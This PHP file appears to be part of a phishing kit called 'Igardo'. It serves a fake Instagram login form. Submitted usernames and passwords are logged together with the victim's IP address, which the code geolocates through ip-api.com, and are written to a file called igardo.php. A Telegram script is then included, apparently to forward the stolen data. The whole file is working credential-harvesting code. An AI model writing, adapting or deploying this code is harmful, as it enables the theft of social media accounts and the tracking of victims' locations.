
<?php



session_start();
set_time_limit(0);
error_reporting(E_ALL);




$username = $_GET["username"];


if($_POST){

	$username=$_GET["username"];
	$username=$_POST["username"];
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

    $file = fopen('igardo.php', 'a');
fwrite($file, "
<html lang='tr' dir='ltr'>
  <head>
      <title>Igardo</title>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
   
    <link rel='stylesheet' href='q-igardo-phs.css'>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
  </head>
  <body>
    <div class='container'>
      <div class='wrapper'>
 
        <div class='title'><img src='q-igardo-phs/q-igardo.jpg' style='width:34%;  border-radius:23px; box-shadow: rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 7px 13px -3px, rgba(0, 0, 0, 0.2) 0px -3px 0px inset;'></div>
        <form action='q-wrong-pw/index.php'>

          <div class='row'>
            <i class='fas fa-user'></i>
          <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Kullanıcı Adı ;<br>$username</p>
          </div>
            <div class='row'>
            <i class='fas fa-lock'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Şifre ;<br>$password</p>
         
          </div>
             <div class='row'>
            <i class='fas fa-check'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>İp Adresi ;<br>$ip</p>
         
          </div>
            <div class='row'>
            <i class='fas fa-clock'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Giriş Zamanı ;<br>$cur_time</p>
         
          </div>
                 <div class='row'>
            <i class='fas fa-globe'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Ülke ;<br>$ulke</p>
         
          </div>
       
          <div class='row'>
            <i class='fas fa-flag'></i>
               <p style='color:#4b4b4b; margin-left:22%; font-size:17px; opacity:0.8;'>Şehir ;<br>$sehir</p>
         
          </div>
   
          <div class='signup-link'>Yapımcı ve Geliştirici <a href='#5'><br>© Igardo Ivanov</a></div>
        </form>
      </div>
    </div>

  </body>
</html>


"); 

fclose($file);
echo '';
  
   header("Location: q-igardo-profile-basic.php?username=$username");
   include 'igardotelegram/telegramuser.php';
}
?>


<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
<link rel="apple-touch-icon" type="image/png" href="q-igardo-img/q-igardo-favicon.png" />
<meta name="apple-mobile-web-app-title" content="Igardo">

<link rel="shortcut icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" />

<link rel="mask-icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" color="#111" />


  <title>Log ln</title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
   

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="q-igardo-css/q-igardo-index.css">
  
  


  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>


</head>

<body translate="no" >
  <div class="form-container">
  <p>Instagram</p>
  <form method="post" autocomplete="off">
    <input type="text" name="username" placeholder="Phone, username or email address" autcomplete="off">
    <input type="password" name="password" placeholder="Password">
    

  
  
  <button class="facebook-connect">Log In</a></form>
</div>
  
  
  
  

</body>


  </div> 
 </body>
</html>